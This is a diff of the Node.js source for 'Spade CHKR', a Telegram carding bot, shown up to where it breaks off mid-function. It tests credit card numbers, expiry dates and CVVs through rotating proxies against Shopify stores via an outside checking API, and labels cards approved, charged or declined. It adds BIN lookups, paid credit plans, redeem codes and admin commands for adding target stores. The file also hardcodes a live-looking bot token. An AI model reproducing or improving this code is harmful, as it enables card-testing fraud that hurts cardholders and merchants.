@@ -1,53 +1,46 @@
+// ==========================================
+// BOT CONFIG — CHANGE HERE ONLY
+// ==========================================
+const BOT_TOKEN = "8507909071:AAGIHe3wPDvFhg5riJ8wvLgZ-_w48f27IYM";
+const ADMIN_ID  = 5291409360;
+const BOT_NAME  = "Spade CHKR";
+const WELCOME_IMG = "https://i.ibb.co/wFtyhXJY/x.jpg";
+// ==========================================
+
 const TelegramBot = require("node-telegram-bot-api");
 const mongoose = require("mongoose");
 const axios = require("axios");
 const express = require("express");
-const { formatProxy, testProxy } = require('./proxy.js');
-const { HttpsProxyAgent } = require('https-proxy-agent');
 require("dotenv").config();
 
-// Environment variables
-const token = process.env.BOT_TOKEN;
 const mongoUrl = process.env.MONGO_URL;
 const port = process.env.PORT || 3000;
-const adminId = 5291409360; // Your Admin ID
 
-// Setup Express Health Check Server
 const app = express();
-app.get("/", (req, res) => res.send("Spade CHKR Bot is running gracefully."));
-app.listen(port, "0.0.0.0", () =>
-  console.log(`Health check server listening on port ${port}`),
-);
+app.get("/", (req, res) => res.send(BOT_NAME + " is running."));
+app.listen(port, "0.0.0.0", () => console.log("Server on port " + port));
 
-// Initialize Bot
-const bot = new TelegramBot(token, { polling: true });
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// Helper Functions
 function escapeHTML(str) {
   if (!str) return "";
-  return String(str)
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;");
+  return String(str).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
+function getRandomItem(arr) {
+  if (!arr || arr.length === 0) return null;
+  return arr[Math.floor(Math.random() * arr.length)];
 }
 
-function sleep(ms) {
-  return new Promise((resolve) => setTimeout(resolve, ms));
-}
-
-function getRandomProxy(proxies) {
-    if (!proxies || proxies.length === 0) return null;
-    return proxies[Math.floor(Math.random() * proxies.length)];
-}
-
-// Database Setup
+// =================== SCHEMAS ===================
 const configSchema = new mongoose.Schema({
   key: { type: String, default: "main_config" },
-  shopifySiteUrl: String,
+  shopifyApiBase: { type: String, default: "https://web-production-3d364.up.railway.app/shopify" },
+  shopifySites: { type: [String], default: [] },
+  globalProxies: { type: [String], default: [] },
 });
-const Config = mongoose.model("Config", configSchema);
+const Config = mongoose.models.Config || mongoose.model("Config", configSchema);
 
-// Additional Schemas for User and Redeem System
 const userSchema = new mongoose.Schema({
   chatId: { type: Number, unique: true },
   firstName: String,
@@ -61,944 +54,798 @@ const userSchema = new mongoose.Schema({
   isBanned: { type: Boolean, default: false },
   proxies: { type: [String], default: [] },
 });
-const User = mongoose.model("User", userSchema);
+const User = mongoose.models.User || mongoose.model("User", userSchema);
 
 const redeemSchema = new mongoose.Schema({
   code: { type: String, unique: true },
-  credits: Number,
-  daysValid: Number,
-  planName: String,
-  isUsed: { type: Boolean, default: false },
-  usedBy: Number,
+  credits: Number, daysValid: Number, planName: String,
+  isUsed: { type: Boolean, default: false }, usedBy: Number,
 });
-const Redeem = mongoose.model("Redeem", redeemSchema);
+const Redeem = mongoose.models.Redeem || mongoose.model("Redeem", redeemSchema);
 
-mongoose
-  .connect(mongoUrl)
-  .then(() => console.log("✅ MongoDB Connected"))
-  .catch((err) => console.error("❌ MongoDB Error:", err));
+mongoose.connect(mongoUrl)
+  .then(() => console.log("MongoDB Connected"))
+  .catch(err => console.error("MongoDB Error:", err));
+process.on("uncaughtException", err => console.error(err));
+process.on("unhandledRejection", r => console.error(r));
 
-process.on("uncaughtException", (err) => console.error(err));
-process.on("unhandledRejection", (reason) => console.error(reason));
-
-// User States
 const userStates = {};
 
-// Ensure User Exists
+// =================== HELPERS ===================
 async function getUser(chatId, firstName) {
   let user = await User.findOne({ chatId });
-  if (!user) {
-    user = await User.create({
-      chatId,
-      firstName,
-      credits: 0,
-      planName: "Free",
-    });
-  }
-
+  if (!user) user = await User.create({ chatId, firstName, credits: 0, planName: "Free" });
   if (user.planExpiry && new Date() > user.planExpiry) {
-    user.credits = 0;
-    user.planName = "Free";
-    user.planExpiry = null;
-    await user.save();
+    user.credits = 0; user.planName = "Free"; user.planExpiry = null; await user.save();
   }
   return user;
 }
 
-// Check & Deduct Credits
 async function deductCredits(user, amount) {
   if (user.isBanned) return false;
   if (user.credits >= amount) {
-    user.credits -= amount;
-    user.totalChecked += amount;
-    await user.save();
-    return true;
+    user.credits -= amount; user.totalChecked += amount; await user.save(); return true;
   }
   return false;
 }
 
-// Core Checker Logic
-// Core Checker Logic
-async function processCard(ccInput, rawProxy, retries = 2) {
+// =================== PROXY FUNCTIONS ===================
+function formatProxyToUrl(raw) {
+  raw = raw.trim();
+  if (!raw) return null;
+  let core = raw;
+  if (raw.includes("://")) core = raw.split("://").slice(1).join("://");
+  if (core.includes("@")) {
+    const atIdx = core.lastIndexOf("@");
+    const auth = core.substring(0, atIdx);
+    const hostPort = core.substring(atIdx + 1);
+    const hp = hostPort.split(":");
+    if (hp.length >= 2) return "http://" + auth + "@" + hp[0] + ":" + hp[1];
+    return null;
+  }
+  const parts = core.split(":");
+  if (parts.length >= 4 && !isNaN(parts[1])) {
+    return "http://" + parts[2] + ":" + parts.slice(3).join(":") + "@" + parts[0] + ":" + parts[1];
+  }
+  if (parts.length === 2 && !isNaN(parts[1])) {
+    return "http://" + parts[0] + ":" + parts[1];
+  }
+  return null;
+}
+
+function proxyUrlToParam(formatted) {
+  try {
+    const u = new URL(formatted);
+    const h = u.hostname, p = u.port || "8080";
+    const un = u.username, pw = u.password;
+    return (un && pw) ? h+":"+p+":"+un+":"+pw : h+":"+p;
+  } catch(e) { return ""; }
+}
+
+// Ultra fast proxy test — 5s timeout
+async function testProxyFast(formatted) {
+  try {
+    const { HttpsProxyAgent } = require("https-proxy-agent");
+    const agent = new HttpsProxyAgent(formatted);
+    const r = await axios.get("https://api.ipify.org?format=json", {
+      httpAgent: agent, httpsAgent: agent, proxy: false, timeout: 5000
+    });
+    return r.data && r.data.ip ? formatted : false;
+  } catch(e) { return false; }
+}
+
+// Test proxies in parallel batches — ULTRA FAST
+async function testProxiesBatch(proxies, batchSize = 10) {
+  const results = [];
+  for (let i = 0; i < proxies.length; i += batchSize) {
+    const batch = proxies.slice(i, i + batchSize);
+    const batchResults = await Promise.all(batch.map(p => testProxyFast(p)));
+    results.push(...batchResults);
+  }
+  return results;
+}
+
+// Site live check — 5s timeout
+async function checkSiteFast(url) {
+  try {
+    const r = await axios.get(url, { timeout: 5000, headers: { "User-Agent": "Mozilla/5.0" } });
+    return r.status >= 200 && r.status < 500;
+  } catch(e) { return false; }
+}
+
+// =================== CARD RESULT CLASSIFIER ===================
+function classifyResponse(responseText, isApprovedFromAPI) {
+  const r = (responseText || "").toUpperCase();
+
+  // APPROVED responses
+  const approvedKeywords = [
+    "APPROVED", "CHARGED", "SUCCESS", "PAYMENT_AUTHORIZED",
+    "OTP_REQUIRED", "3DS_REQUIRED", "3D_SECURE", "AUTHENTICATION_REQUIRED",
+    "REDIRECT", "PENDING"
+  ];
+
+  // DECLINED responses
+  const declinedKeywords = [
+    "DECLINED", "INSUFFICIENT", "DO NOT HONOR", "INVALID", "EXPIRED",
+    "STOLEN", "BLOCKED", "RESTRICTED", "LOST", "PICKUP", "SECURITY"
+  ];
+
+  // CHARGED responses
+  const chargedKeywords = ["CHARGED", "PAYMENT_AUTHORIZED", "AMOUNT_CAPTURED"];
+
+  let category = "declined";
+  if (isApprovedFromAPI) category = "approved";
+
+  for (const kw of approvedKeywords) {
+    if (r.includes(kw)) { category = "approved"; break; }
+  }
+  for (const kw of chargedKeywords) {
+    if (r.includes(kw)) { category = "charged"; break; }
+  }
+  for (const kw of declinedKeywords) {
+    if (r.includes(kw)) { category = "declined"; break; }
+  }
+
+  return category;
+}
+
+// =================== PROCESS CARD ===================
+// =================== PROCESS CARD ===================
+async function processCard(ccInput, rawProxy) {
   let result = {
     cc: escapeHTML(ccInput),
-    isApproved: false,
-    statusText: "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌",
+    category: "declined",
+    statusText: "DECLINED",
     responseText: "DECLINED",
     brand: "VISA",
     issuer: "BANK",
-    country: "USA 🇺🇸",
+    country: "USA",
   };
 
-  let axiosConfig = {
-    timeout: 20000,
-    proxy: false,
-    headers: {
-      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
-      Accept: "application/json",
-    },
-  };
+  try {
+    // ✅ Get config from DB
+    const cfg = await Config.findOne({ key: "main_config" });
 
-  for (let i = 0; i <= retries; i++) {
-    try {
-      // ✅ Get site from DB
-      let config = await Config.findOne({ key: "main_config" });
-      let siteUrl = config?.shopifySiteUrl || "https://planterhomawholesale.com/";
-      if (!siteUrl.endsWith("/")) siteUrl += "/";
+    // ✅ API Base — jo admin ne set kiya hai
+    const apiBase = (cfg && cfg.shopifyApiBase)
+      ? cfg.shopifyApiBase.trim()
+      : "https://nik.cards/shopify";
 
-      // ✅ Format CC: ensure 4-digit year, padded month
-      const ccParts = ccInput.trim().split(/[|\/\s]+/);
-      let formattedCC = ccInput.trim();
+    // ✅ Site — random from saved sites
+    const sites = (cfg && cfg.shopifySites && cfg.shopifySites.length > 0)
+      ? cfg.shopifySites
+      : ["https://touch-of-finland.myshopify.com/"];
+    let site = getRandomItem(sites);
+    if (!site.endsWith("/")) site += "/";
 
-      if (ccParts.length === 4) {
-        let [num, mm, yy, cvv] = ccParts;
-        if (yy.length === 2) yy = "20" + yy;
-        if (mm.length === 1) mm = "0" + mm;
-        formattedCC = `${num}|${mm}|${yy}|${cvv}`;
-      }
-
-      // ✅ Build proxy param (strip protocol)
-      let proxyParam = "";
-      if (rawProxy) {
-        proxyParam = rawProxy
-          .replace(/^https?:\/\//, "")
-          .replace(/^socks5?:\/\//, "");
-      }
-
-      // ✅ Build URL — NO encodeURIComponent (nik.cards needs raw URL)
-      let apiUrl = `https://nik.cards/shopify?site=${siteUrl}&cc=${formattedCC}`;
-      if (proxyParam) {
-        apiUrl += `&proxy=${proxyParam}`;
-      }
-
-      console.log(`[CHECK] URL: ${apiUrl}`);
-
-      const shopifyRes = await axios.get(apiUrl, axiosConfig);
-      const data = shopifyRes.data || {};
-
-      console.log(`[CHECK] Response:`, JSON.stringify(data));
-
-      // ✅ Parse response
-      let isApproved = false;
-      let responseMsg = "DECLINED";
-
-      if (typeof data.Status !== "undefined") {
-        isApproved = data.Status === true || data.Status === "true";
-        responseMsg = data.Response || data.Message || (isApproved ? "APPROVED" : "DECLINED");
-      } else if (typeof data.status !== "undefined") {
-        isApproved = String(data.status).toLowerCase() === "approved" || String(data.status).toLowerCase() === "true";
-        responseMsg = data.message || data.Response || (isApproved ? "APPROVED" : "DECLINED");
-      } else if (typeof data.success !== "undefined") {
-        isApproved = data.success === true;
-        responseMsg = data.msg || data.message || (isApproved ? "APPROVED" : "DECLINED");
-      } else {
-        const raw = JSON.stringify(data).toLowerCase();
-        isApproved = raw.includes("approved") && !raw.includes("not approved");
-        responseMsg = data.Response || data.message || data.msg || "DECLINED";
-      }
-
-      result.isApproved = isApproved;
-      result.statusText = isApproved ? "𝗔𝗣𝗣𝗥𝗢𝗩𝗘𝗗 ✅" : "𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 ❌";
-      result.responseText = escapeHTML(String(responseMsg));
-
-      break; // ✅ Success — stop retrying
-
-    } catch (error) {
-      console.error(`[CHECK] Error attempt ${i + 1}:`, error.message);
-      if (i === retries) {
-        let errMsg =
-          error.response?.data?.Response ||
-          error.response?.data?.message ||
-          error.response?.statusText ||
-          error.message ||
-          "API Error";
-        result.responseText = escapeHTML(String(errMsg));
-      } else {
-        await sleep(2000 * (i + 1));
-      }
+    // ✅ CC Format — ensure pipe format with 4-digit year
+    const ccParts = ccInput.trim().split(/[|\/\s]+/);
+    let formattedCC = ccInput.trim();
+    if (ccParts.length === 4) {
+      let [num, mm, yy, cvv] = ccParts;
+      if (yy.length === 2) yy = "20" + yy;   // 27 → 2027
+      if (mm.length === 1) mm = "0" + mm;     // 9 → 09
+      formattedCC = `${num}|${mm}|${yy}|${cvv}`;
     }
+
+    // ✅ Proxy param — strip protocol, keep raw string
+    let proxyParam = "";
+    if (rawProxy) {
+      // Remove http:// or socks5:// if present
+      proxyParam = rawProxy
+        .replace(/^https?:\/\//, "")
+        .replace(/^socks5?:\/\//, "")
+        .trim();
+    }
+
+    // ✅ Build Final URL — NO encodeURIComponent on site or cc
+    let apiUrl = `${apiBase}?site=${site}&cc=${formattedCC}`;
+    if (proxyParam) {
+      apiUrl += `&proxy=${proxyParam}`;
+    }
+
+    // Log exact URL for debugging
+    console.log(`[CHECK] → ${apiUrl}`);
+
+    // ✅ Make request
+    const res = await axios.get(apiUrl, {
+      timeout: 40000,
+      proxy: false, // disable axios default proxy
+      headers: {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
+        "Accept": "application/json",
+      },
+    });
+
+    const data = res.data || {};
+    console.log(`[CHECK] ← ${JSON.stringify(data)}`);
+
+    // ✅ Parse response — handle all formats
+    let isApproved = false;
+    let responseMsg = "DECLINED";
+
+    if (typeof data.Status !== "undefined") {
+      // Format: { Status: true, Response: "..." }
+      isApproved = data.Status === true || data.Status === "true";
+      responseMsg = data.Response || data.Message || (isApproved ? "APPROVED" : "DECLINED");
+    } else if (typeof data.status !== "undefined") {
+      // Format: { status: "approved" / "success", message: "..." }
+      isApproved =
+        String(data.status).toLowerCase() === "approved" ||
+        String(data.status).toLowerCase() === "success" ||
+        String(data.status).toLowerCase() === "true";
+      responseMsg = data.message || data.Response || (isApproved ? "APPROVED" : "DECLINED");
+    } else if (typeof data.success !== "undefined") {
+      // Format: { success: true, msg: "..." }
+      isApproved = data.success === true;
+      responseMsg = data.msg || data.message || (isApproved ? "APPROVED" : "DECLINED");
+    } else {
+      // Fallback — scan raw JSON
+      const raw = JSON.stringify(data).toLowerCase();
+      isApproved = raw.includes("approved") && !raw.includes("not approved") && !raw.includes("declined");
+      responseMsg = data.Response || data.message || data.msg || data.result || "DECLINED";
+    }
+
+    result.responseText = escapeHTML(String(responseMsg));
+    result.category = classifyResponse(result.responseText, isApproved);
+
+  } catch (err) {
+    console.error(`[CHECK] ERROR: ${err.message}`);
+    const em =
+      err.response?.data?.Response ||
+      err.response?.data?.message ||
+      err.response?.statusText ||
+      err.message ||
+      "API Error";
+    result.responseText = escapeHTML(String(em));
+    result.category = "declined";
   }
 
+  // ✅ Set status text
+  if (result.category === "approved") result.statusText = "APPROVED ✅";
+  else if (result.category === "charged") result.statusText = "CHARGED 💳";
+  else result.statusText = "DECLINED ❌";
+
   // ✅ BIN Lookup
-  const bin = ccInput.replace(/[^0-9]/g, "").substring(0, 6);
+  const bin = ccInput.replace(/[^\d]/g, "").substring(0, 6);
   try {
-    const binRes = await axios.get(`https://lookup.binlist.net/${bin}`, {
-      timeout: 5000,
+    const br = await axios.get(`https://lookup.binlist.net/${bin}`, {
+      timeout: 3000,
       headers: { "Accept-Version": "3" },
     });
-    if (binRes.data) {
-      result.brand = escapeHTML(binRes.data.scheme?.toUpperCase() || result.brand);
-      result.issuer = escapeHTML(binRes.data.bank?.name?.toUpperCase() || result.issuer);
-      result.country = `${escapeHTML(binRes.data.country?.name?.toUpperCase() || "USA")} ${binRes.data.country?.emoji || "🇺🇸"}`;
+    if (br.data) {
+      result.brand   = escapeHTML((br.data.scheme || "VISA").toUpperCase());
+      result.issuer  = escapeHTML((br.data.bank?.name || "BANK").toUpperCase());
+      const cn = (br.data.country?.name || "USA").toUpperCase();
+      const ce = br.data.country?.emoji || "";
+      result.country = escapeHTML(cn) + " " + ce;
     }
-  } catch (e) {}
+  } catch (e) { /* silent */ }
 
   return result;
 }
 
+// =================== FORMAT RESULT ===================
 function formatCardResult(data, userName, userId) {
+  const si = data.category === "approved" || data.category === "charged"
+    ? "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji>"
+    : "<tg-emoji emoji-id=\"5402104393396931859\">\u274C</tg-emoji>";
+
   return (
-    `<tg-emoji emoji-id="${data.isApproved ? "6138803821394009204" : "5402104393396931859"}">✨</tg-emoji> 𝐒𝐭𝐚𝐭𝐮𝐬 ➠ ${data.statusText}\n` +
-    `<tg-emoji emoji-id="6138728977293907990">💳</tg-emoji> 𝐂𝐚𝐫𝐝 ➠ <code>${data.cc}</code>\n` +
-    `<tg-emoji emoji-id="6136204644625423818">⚡</tg-emoji> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ➠ 𝐒𝐡𝐨𝐩𝐢𝐟𝐲 𝟎.𝟗𝟖 𝐔𝐒𝐃\n` +
-    `<tg-emoji emoji-id="6138961691506907344">⚙️</tg-emoji> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➠ ${data.responseText}\n` +
-    `━━━━━━━━━━━━━━━━━\n` +
-    `🏦 𝐁𝐫𝐚𝐧𝐝 ➠ ${data.brand}\n` +
-    `🏛 𝐈𝐬𝐬𝐮𝐞𝐫 ➠ ${data.issuer}\n` +
-    `🌍 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ➠ ${data.country}\n` +
-    `━━━━━━━━━━━━━━━━━\n` +
-    `👤 𝐔𝐬𝐞𝐫 ➠ <a href="tg://user?id=${userId}">${escapeHTML(userName || "User")}</a>\n` +
-    `<tg-emoji emoji-id="6136250085379413636">💎</tg-emoji> 𝐃𝐞𝐯 ➠ @ZeroSpade`
+    si + " <b>Status</b> \u27A0 " + data.statusText + "\n" +
+    "<tg-emoji emoji-id=\"5195072744798051557\">\uD83D\uDCB3</tg-emoji> <b>Card</b> \u27A0 <code>" + data.cc + "</code>\n" +
+    "<tg-emoji emoji-id=\"6136204644625423818\">\u26A1</tg-emoji> <b>Gateway</b> \u27A0 Shopify 0.98 USD\n" +
+    "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Response</b> \u27A0 " + data.responseText + "\n" +
+    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
+    "<tg-emoji emoji-id=\"6159080241739342919\">\uD83C\uDFE6</tg-emoji> <b>Brand</b> \u27A0 " + data.brand + "\n" +
+    "<tg-emoji emoji-id=\"6159080241739342919\">\uD83C\uDFDB</tg-emoji> <b>Issuer</b> \u27A0 " + data.issuer + "\n" +
+    "<tg-emoji emoji-id=\"4956560549287560231\">\uD83C\uDF0D</tg-emoji> <b>Country</b> \u27A0 " + data.country + "\n" +
+    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
+    "<tg-emoji emoji-id=\"4956461073550017373\">\uD83D\uDC64</tg-emoji> <b>User</b> \u27A0 <a href=\"tg://user?id=" + userId + "\">" + escapeHTML(userName || "User") + "</a>\n" +
+    "<tg-emoji emoji-id=\"4956420911310832630\">\uD83D\uDC8E</tg-emoji> <b>Dev</b> \u27A0 @ZeroSpade"
   );
 }
 
-function sendUserHome(msg) {
-  const caption =
-    `<tg-emoji emoji-id="6138869285285537620">♠️</tg-emoji> 𝑾𝑬𝑳𝑪𝑶𝑴𝑬 𝑻𝑶 <a href="https://t.me/Spade_ChkrBot">𝐒𝐩𝐚𝐝𝐞 𝐂𝐇𝐊𝐑</a>\n` +
-    `━━━━━━━━━━━━━\n` +
-    `<tg-emoji emoji-id="6138532229137049159">🔥</tg-emoji> 𝑾𝑯𝑬𝑹𝑬 𝑳𝑬𝑮𝑬𝑵𝑫𝑺 𝑩𝑼𝑹𝑵 𝑻𝑯𝑹𝑶𝑼𝑮𝑯 𝑭𝑰𝑹𝑬 <tg-emoji emoji-id="6253483549890973859">🔥</tg-emoji>\n` +
-    `𝑮𝑶𝒕 𝒀𝒐𝒖𝒓 𝑭𝒖𝒍𝒍 𝑽𝒂𝒍𝒖𝒆 𝑯𝒆𝒓𝒆\n` +
-    `━━━━━━━━━━━━━\n` +
-    `<tg-emoji emoji-id="5258332798409783582">⚙️</tg-emoji> 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 ~ 𝐯𝟐.𝟎\n` +
-    `━━━━━━━━━━━━━\n` +
-    `<tg-emoji emoji-id="6136205108481890460">👑</tg-emoji> 𝐃𝐞𝐯 ~ <a href="https://t.me/ZeroSpade">𝘚𝘱𝘢𝘥𝘦 • 𝘔𝘪𝘯𝘪𝘴𝘵𝘦𝘳</a> <tg-emoji emoji-id="6086904445906459445">👑</tg-emoji>`;
-
-  const premiumKeyboard = {
-    inline_keyboard: [
-      [
-        {
-          text: " Gᴀᴛᴇs",
-          callback_data: "gate_menu",
-          icon_custom_emoji_id: "6136316288005314906",
-          color: "primary",
-        },
-        {
-          text: " Mᴀss",
-          callback_data: "mass_menu",
-          icon_custom_emoji_id: "6138728977293907990",
-          color: "primary",
-        },
-      ],
-      [
-        {
-          text: " Pʀᴏғɪʟᴇ",
-          callback_data: "profile_menu",
-          icon_custom_emoji_id: "6136250085379413636",
-          color: "primary",
-        },
-        {
-          text: " Tᴏᴏʟs",
-          callback_data: "tools_menu",
-          icon_custom_emoji_id: "6138961691506907344",
-          color: "primary",
-        },
-      ],
-      [
-        {
-          text: " Pʀɪᴄɪɴɢ",
-          callback_data: "pricing_menu",
-          icon_custom_emoji_id: "5424976816530014958",
-          color: "primary",
-        },
-        {
-          text: " OᴡɴᴇR ↗",
-          url: "https://t.me/ZeroSpade",
-          icon_custom_emoji_id: "6136665868278438410",
-          color: "primary",
-        },
-      ],
-    ],
-  };
-
-  bot.sendPhoto(msg.chat.id, "https://i.ibb.co/wFtyhXJY/x.jpg", {
-    caption: caption,
-    parse_mode: "HTML",
-    reply_markup: premiumKeyboard,
-  });
+// Result keyboard with colored buttons
+function getResultKeyboard(category) {
+  if (category === "approved") {
+    return { inline_keyboard: [[{ text: "✅ APPROVED", callback_data: "noop" }]] };
+  } else if (category === "charged") {
+    return { inline_keyboard: [[{ text: "💙 CHARGED", callback_data: "noop" }]] };
+  } else {
+    return { inline_keyboard: [[{ text: "🔴 DECLINED", callback_data: "noop" }]] };
+  }
 }
 
-// --- START COMMAND ---
+// =================== WELCOME ===================
+function sendUserHome(chatId) {
+  const caption =
+    "<tg-emoji emoji-id=\"6138869285285537620\">\u2660\uFE0F</tg-emoji> <b>WELCOME TO " + escapeHTML(BOT_NAME) + "</b>\n" +
+    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
+    "<tg-emoji emoji-id=\"6138532229137049159\">\uD83D\uDD25</tg-emoji> WHERE LEGENDS BURN THROUGH FIRE <tg-emoji emoji-id=\"6253483549890973859\">\uD83D\uDD25</tg-emoji>\n" +
+    "Got Your Full Value Here\n" +
+    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
+    "<tg-emoji emoji-id=\"5258332798409783582\">\u2699\uFE0F</tg-emoji> Version ~ v1.0\n" +
+    "\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n" +
+    "<tg-emoji emoji-id=\"6136205108481890460\">\uD83D\uDC51</tg-emoji> Dev ~ <a href=\"https://t.me/ZeroSpade\">Spade Minister</a>";
+  const keyboard = { inline_keyboard: [
+    [{ text: "Gates", callback_data: "gate_menu", icon_custom_emoji_id: "6136316288005314906" },
+     { text: "Mass", callback_data: "mass_menu", icon_custom_emoji_id: "6138728977293907990" }],
+    [{ text: "Profile", callback_data: "profile_menu", icon_custom_emoji_id: "6136250085379413636" },
+     { text: "Tools", callback_data: "tools_menu", icon_custom_emoji_id: "6138961691506907344" }],
+    [{ text: "Pricing", callback_data: "pricing_menu", icon_custom_emoji_id: "5424976816530014958" },
+     { text: "Owner", url: "https://t.me/ZeroSpade", icon_custom_emoji_id: "6136665868278438410" }],
+  ]};
+  bot.sendPhoto(chatId, WELCOME_IMG, { caption, parse_mode: "HTML", reply_markup: keyboard })
+    .catch(() => bot.sendMessage(chatId, caption, { parse_mode: "HTML", reply_markup: keyboard }));
+}
+
+// =================== /start ===================
 bot.onText(/^\/start/, async (msg) => {
-  delete userStates[msg.chat.id]; // Reset state
+  delete userStates[msg.chat.id];
   await getUser(msg.chat.id, msg.from.first_name);
-
-  if (msg.chat.id === adminId) {
-    const adminText = `<tg-emoji emoji-id="5215399540814781035">👑</tg-emoji> <b>𝐀𝐃𝐌𝐈𝐍 𝐏𝐀𝐍𝐄𝐋</b>\n\nWelcome back, Developer! Choose an option to manage the bot:`;
-    const adminKeyboard = {
-      inline_keyboard: [
-        [{ text: " Users List", callback_data: "admin_users_list" }],
-        [
-          { text: " Manage Users", callback_data: "admin_manage_users" },
-          { text: " Broadcast", callback_data: "admin_broadcast" },
-        ],
-        [{ text: " Generate Redeem", callback_data: "admin_gen_redeem" }],
-        [{ text: " Access User Menu", callback_data: "admin_user_menu" }],
-      ],
-    };
-    return bot.sendMessage(msg.chat.id, adminText, {
-      parse_mode: "HTML",
-      reply_markup: adminKeyboard,
-    });
+  if (msg.chat.id === ADMIN_ID) {
+    return bot.sendMessage(msg.chat.id,
+      "<tg-emoji emoji-id=\"5215399540814781035\">\uD83D\uDC51</tg-emoji> <b>ADMIN PANEL</b>\n\nWelcome back, Developer!",
+      { parse_mode: "HTML", reply_markup: { inline_keyboard: [
+        [{ text: "Users List", callback_data: "admin_users_list" }],
+        [{ text: "Manage Users", callback_data: "admin_manage_users" }, { text: "Broadcast", callback_data: "admin_broadcast" }],
+        [{ text: "Generate Redeem", callback_data: "admin_gen_redeem" }],
+        [{ text: "User Menu", callback_data: "admin_user_menu" }],
+      ]}});
   }
-
-  sendUserHome(msg);
+  sendUserHome(msg.chat.id);
 });
 
-bot.onText(/^\/proxy(?:\s*(.*))?/, async (msg, match) => {
-  const chatId = msg.chat.id;
-  await getUser(chatId, msg.from.first_name); 
+// =================== SITE FUNCTIONS ===================
+function parseSites(text) {
+  return text.split(/[\n,]+/).map(s => s.trim()).filter(s => s.startsWith("http"));
+}
 
-  let proxyText = match[1] || "";
-  
+async function processSiteAdd(chatId, text) {
+  const candidates = parseSites(text);
+  if (candidates.length === 0) return bot.sendMessage(chatId, "\u274C No valid URLs found. Must start with https://");
+  const statusMsg = await bot.sendMessage(chatId,
+    "<tg-emoji emoji-id=\"5213452215527677338\">\u23F3</tg-emoji> <b>Checking " + candidates.length + " sites...</b>",
+    { parse_mode: "HTML" });
+  const cfg = await Config.findOne({ key: "main_config" });
+  const existing = (cfg && cfg.shopifySites) ? cfg.shopifySites : [];
+  let added = 0, dead = 0, duplicate = 0;
+  const newSites = [...existing];
+  // Check sites in parallel
+  const checks = await Promise.all(candidates.map(s => checkSiteFast(s)));
+  candidates.forEach((site, i) => {
+    if (existing.includes(site)) { duplicate++; return; }
+    if (checks[i]) { newSites.push(site); added++; }
+    else { dead++; }
+  });
+  await Config.findOneAndUpdate({ key: "main_config" }, { shopifySites: newSites }, { upsert: true });
+  bot.editMessageText(
+    "<tg-emoji emoji-id=\"6138803821394009204\">\u2705</tg-emoji> <b>Sites Updated!</b>\n\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\u2501\n\u2705 Added: " + added + "\n\u274C Dead: " + dead + "\n\uD83D\uDD04 Duplicate: " + duplicate + "\n\uD83C\uDFE6 Total: " + newSites.length,
+    { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
+  );
+}
+
+// =================== /addsite ===================
+bot.onText(/^\/addsite(?:\s*(.*))?/, async (msg, match) => {
+  if (msg.chat.id !== ADMIN_ID) return;
+  let text = match[1] ? match[1].trim() : "";
   if (msg.reply_to_message) {
-      if (msg.reply_to_message.text) {
-          proxyText = msg.reply_to_message.text;
-      } else if (msg.reply_to_message.document && msg.reply_to_message.document.mime_type === "text/plain") {
-          const fileLink = await bot.getFileLink(msg.reply_to_message.document.file_id);
-          const fileRes = await axios.get(fileLink);
-          proxyText = fileRes.data;
-      }
+    if (msg.reply_to_message.text) text = msg.reply_to_message.text;
+    else if (msg.reply_to_message.document) {
+      try { const fl = await bot.getFileLink(msg.reply_to_message.document.file_id); text = (await axios.get(fl)).data; } catch(e) {}
+    }
   }
-
-  if (!proxyText.trim()) {
-    return bot.sendMessage(chatId, "⚠️ <b>Missing proxy!</b>\n\n<i>Usage: /proxy username:password@host:port</i>\n\n<i>Or reply to a message containing proxies with /proxy</i>", { parse_mode: "HTML" });
+  if (!text.trim()) {
+    userStates[msg.chat.id] = "WAITING_ADDSITE";
+    return bot.sendMessage(msg.chat.id,
+      "<tg-emoji emoji-id=\"6138961691506907344\">\u2699\uFE0F</tg-emoji> <b>Send sites (one per line) or .txt file:</b>\n<code>https://site1.myshopify.com\nhttps://site2.myshopify.com</code>",
+      { parse_mode: "HTML" });
   }
-
-  let statusMsg = await bot.sendMessage(chatId, "⏳ Testing your proxies...", { parse_mode: "HTML" });
-  
-  const candidates = proxyText.split(/[\n\s]+/).map(p => p.trim()).filter(p => p.length > 5);
-  let user = await User.findOne({ chatId });
-  
-  let validAdded = 0;
-  let alreadyMax = false;
-  let workingList = [];
-
-  for (let rawProxy of candidates) {
-      if (user.proxies.length >= 10) {
-          alreadyMax = true;
-          break;
-      }
-      const formatted = formatProxy(rawProxy);
-      if (formatted && !user.proxies.includes(formatted)) {
-          const isLive = await testProxy(formatted);
-          if (isLive) {
-              user.proxies.push(isLive);
-              workingList.push(isLive);
